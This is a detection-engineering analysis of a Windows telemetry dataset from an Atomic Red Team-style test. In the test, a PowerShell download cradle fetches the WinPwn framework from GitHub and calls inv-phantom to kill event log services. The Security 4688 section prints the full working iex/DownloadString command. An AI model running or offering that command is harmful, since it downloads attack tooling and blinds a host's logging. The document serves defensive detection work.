# T1562.001-30: Disable or Modify Tools — WinPwn - Kill the Event Log Services for Stealth

## Technique Context

MITRE ATT&CK T1562.001 (Impair Defenses: Disable or Modify Tools) includes adversary
actions that stop or impair event logging to reduce defensive visibility. WinPwn is a
publicly available PowerShell-based post-exploitation framework. Its `inv-phantom` function
is designed to kill Windows Event Log-related services, preventing the host from capturing
security telemetry and reducing visibility of subsequent attacker activity. Killing the event
logging service is a well-established anti-forensic technique used by ransomware groups and
nation-state actors prior to lateral movement or data exfiltration.

This test downloads WinPwn directly from GitHub using a PowerShell download cradle and
invokes `inv-phantom -consoleoutput -noninteractive`. In the defended dataset, AMSI blocked
this before `inv-phantom` executed. In this **undefended** dataset, Defender is disabled —
the download and execution are not blocked by Defender at the point of invocation.

## What This Dataset Contains

The dataset captures 119 events across four channels (1 Application, 112 PowerShell, 3
Security, 3 Sysmon) spanning approximately 5 seconds on ACME-WS06 (Windows 11 Enterprise
Evaluation, 2026-03-17).

**Security EID 4688 — Full IEX download cradle captured as the command line of the spawned
PowerShell process:**

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
inv-phantom -consoleoutput -noninteractive}
```

This is the full attack command: a live `DownloadString` cradle fetching WinPwn from a
pinned commit on GitHub (`121dcee26a7aca368821563cbe92b2b5638c5773`), followed immediately
by `inv-phantom`. The parent PowerShell runs as `NT AUTHORITY\SYSTEM`. Two additional 4688
events capture `whoami.exe`.

**Sysmon EID 22 — DNS query for the WinPwn download target:**

```
QueryName: raw.githubusercontent.com
QueryResults: ::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;
Image: <unknown process>
```

The DNS query is attributed to `<unknown process>` because the process that issued it
terminated before Sysmon could resolve its image path — consistent with the short-lived
PowerShell child process that ran the download cradle.

**Sysmon EID 3 (two events) — Network connections from `MsMpEng.exe`:**

```
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MsMpEng.exe
SourceIp: 192.168.4.16
DestinationIp: 48.211.71.198
DestinationPort: 443
Protocol: tcp
```

These are outbound Defender telemetry connections. Even with Defender's real-time protection
disabled, the engine binary (`MsMpEng.exe`) continues to run and phones home to Microsoft
cloud endpoints. The sysmon-modular rule tags these with `T1036/Masquerading` — that is a
false positive from the rule matching on a network connection from a process in the
`ProgramData\Microsoft\Windows Defender\Platform` path.

**Application EID 15 — `SECURITY_PRODUCT_STATE_ON`** reflecting a Defender Security Center
state refresh during the test window.

**PowerShell EID 4104 — 109 script block events.** The notable blocks are:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
$ErrorActionPreference = 'Continue'
```

And the cleanup invocation:

```powershell
try {
    Invoke-AtomicTest T1562.001 -TestNumbers 30 -Cleanup -Confirm:$false 2>&1 | Out-Null
} catch {}
```

**No WinPwn source code appears in the 4104 events.** This is discussed below.

**PowerShell EID 4103 — One module pipeline event** for the `Set-ExecutionPolicy` test framework
call.

## What This Dataset Does Not Contain

**WinPwn script content in PowerShell 4104.** Despite Defender being disabled, the WinPwn
script content does not appear as a script block in this dataset. This is unexpected and
significant: it implies that either the `DownloadString` + `Invoke-Expression` path did not
log the downloaded script in the 4104 stream (possible if the script was not successfully
loaded into the PowerShell engine as a new script block before execution), or the download
itself failed or produced a truncated response. The absence of WinPwn content in 4104 with
Defender disabled is a notable gap compared to what would be expected from full script block
logging of an `iex(downloadstring(...))` cradle.

**Event Log service termination events.** No System EID 7034, 7036, or Service Control
Manager events appear indicating the Windows Event Log service was stopped. Whether
`inv-phantom` successfully executed and killed the event log service cannot be confirmed
from this dataset alone.

**Sysmon EID 1 for the WinPwn child PowerShell.** The 4688 Security event captures the
launch of the child `powershell.exe`, but no corresponding Sysmon EID 1 is in the bundled
data. The Sysmon process create capture relies on include rules matching the process — the
absence here may reflect a timing issue or rule filtering.

**`sc.exe`, `net.exe`, or `taskkill.exe` process creates.** These are the process creates
that would appear if `inv-phantom` successfully enumerated and killed event log service
processes. Their absence from the 4688 events suggests `inv-phantom` either did not execute
or was limited in its actions within the test window.

## Assessment

This dataset is important because it documents what a live WinPwn download cradle looks like
in telemetry when Defender is not actively blocking it. The Security 4688 command line
contains the full GitHub URL with a pinned commit hash — a specific, attributable indicator.
The Sysmon EID 22 DNS query for `raw.githubusercontent.com` and the EID 3 network connections
from `MsMpEng.exe` provide network-layer visibility.

The critical open question is whether `inv-phantom` executed and killed the event log
services. The absence of service stop events and the absence of WinPwn source code in 4104
blocks suggest either the script failed silently or the execution occurred outside the
collection window. The MsMpEng.exe network connections at 48.211.71.198:443 are consistent
with Defender detecting and reporting the download attempt even without real-time blocking
active.

In the defended dataset, AMSI explicitly blocked the script with
`ScriptContainedMaliciousContent`. Here, that block is absent — but the script content
also does not appear in the logs, leaving the actual outcome ambiguous in this telemetry.

## Detection Opportunities Present in This Data

**Security EID 4688 — IEX download cradle with pinned GitHub commit hash.** The specific URL
`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee...` is a high-confidence
WinPwn indicator. Any IEX + `net.webclient.downloadstring` cradle targeting GitHub raw
content domains should be treated as high priority.

**Sysmon EID 22 — DNS query for `raw.githubusercontent.com` from a PowerShell process.**
Legitimate PowerShell scripts rarely perform direct DownloadString calls to GitHub raw
content. DNS queries for `raw.githubusercontent.com` from PowerShell, especially in context
with high-privilege execution, are a meaningful behavioral indicator.

**Sysmon EID 3 — `MsMpEng.exe` outbound connections following suspicious PowerShell.** The
Defender telemetry upload to 48.211.71.198:443 immediately after the attack attempt serves
as a temporal marker. Correlating Defender cloud connections with suspicious command-line
executions in the seconds preceding them can help identify when Defender detected but did
not block an action.

**PowerShell EID 4688 command line containing `inv-phantom`.** The function name is specific
to WinPwn. Any PowerShell command line or script block containing `inv-phantom` is a direct
WinPwn indicator.
